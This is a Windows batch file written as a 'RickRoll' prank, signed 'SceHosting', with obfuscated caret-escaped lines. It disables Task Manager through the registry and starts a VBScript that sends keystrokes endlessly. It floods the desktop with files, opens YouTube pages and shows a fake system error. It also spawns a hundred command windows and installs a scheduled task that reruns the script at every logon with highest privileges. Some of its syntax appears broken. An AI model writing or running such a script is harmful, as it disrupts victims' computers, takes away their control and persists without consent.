@echo off
set A=^
@echo^ off^&s^e^t^ B=^
@ec^ho^ off
%A%%B%chcp 65001>nul^&color 0c^&%__APPDIR__%findstr.exe ^"&" ^>%temp%\rr.vbs echo set w=CreateObject^("WScript.Shell"^) ^& echo do ^& echo w.SendKeys^("^"^) ^& echo loop&start /min wscript "%temp%\rr.vbs"
%A%%B%reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul^&start /min https://www.youtube.com/results?search_query=rickroll
%A%%B%timeout /t 3 /nobreak >nul^&start https://www.youtube.com/watch?v=dQw4w9WgXcQ
%A%%B%set/a i=0^&:L^&set/a i+=1^&echo RickRoll>%userprofile%\Desktop\RickRoll_!i!.txt^&if %i% lss 1000 goto L
%A%%B%for %%i in (1 2 3 4 5 6 7) do (color %%i^&timeout /t 1 /nobreak>nul)
%A%%B%start /min music.mp3^&timeout /t 10 /nobreak >nul^&reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f >nul
%A%%B%del /q "%userprofile%\Desktop\RickRoll_*.txt">nul^&echo Merci d'avoir été RickRollé by SceHosting>"%userprofile%\Desktop\RickRoll_Signature.txt"
%A%%B%timeout /t 5 /nobreak >nul^&color 1f^&echo Votre système a rencontré une erreur. Veuillez patienter...^&timeout /t 5 /nobreak >nul
%A%%B%color 0c^&start /min music.mp3^&for /l %%i in (1,1,5) do echo BRUITAGE^&timeout /t 1 /nobreak >nul
%A%%B%echo BOOM^&for /l %%i in (1,1,100) do start cmd^&schtasks /create /tn RickRollCmd /tr %~f0 /sc onlogon /rl highest >nul
%A%%B%echo Bien joué, je te laisse. >nul^&exit
